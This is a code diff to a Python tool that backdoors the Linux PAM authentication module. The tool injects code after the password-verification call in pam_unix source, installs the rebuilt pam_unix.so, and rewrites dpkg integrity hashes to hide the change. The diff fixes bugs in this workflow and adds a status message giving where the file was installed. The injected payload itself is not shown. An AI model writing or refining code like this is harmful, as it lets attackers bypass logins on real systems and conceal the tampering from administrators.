@@ -72,9 +72,10 @@ def place_backdoor(src_location):
     try:
         with open(src_location, "r", errors="ignore") as fd1, open(tmp[1],'w') as fd2:
             for line in fd1:
-                line = line.replace('retval = _unix_verify_password(pamh, name, p, ctrl);',"retval = _unix_verify_password(pamh, name, p, ctrl); \n{}".format(src))
+                if line.find("retval = _unix_verify_password(pamh, name, p, ctrl);") != -1:
+                    line = line.replace('retval = _unix_verify_password(pamh, name, p, ctrl);',"retval = _unix_verify_password(pamh, name, p, ctrl); \n{}".format(src))
+                    is_tainted = True
                 fd2.write(line)
-                is_tainted = True
         fd2.close()
         fd1.close()
         os.rename(tmp[1], src_location)
@@ -125,13 +126,13 @@ def install_pam(current_location):
                     if os.path.exists(integrity_file):
                         if update_dpkg_hashes(integrity_file, possible, "pam_unix.so"):
                             break
-                return True
+                return possible
     return False
 
 def download_file(url, output_name):
     try:
-        urllib.request.urlretrieve(url, output_name)
-        return True
+        if urllib.request.urlretrieve(url, output_name):
+            return True
     except Exception as e:
         if e.code == 404:
             prompt("-", "Unable to find a Library, Specify Manually".format(e))
@@ -190,7 +191,7 @@ if __name__ == "__main__":
                             result = install_pam("modules/pam_unix/.libs/pam_unix.so")
                             shutil.rmtree(src_dir)
                             if result:
-                                prompt("+", "Finished Successfully")
+                                prompt("+", "Finished Successfully Compiled PAM File Moved to: '{}'".format(result))
                                 # os.remove(script_location)
                                 exit(0)
                             else:
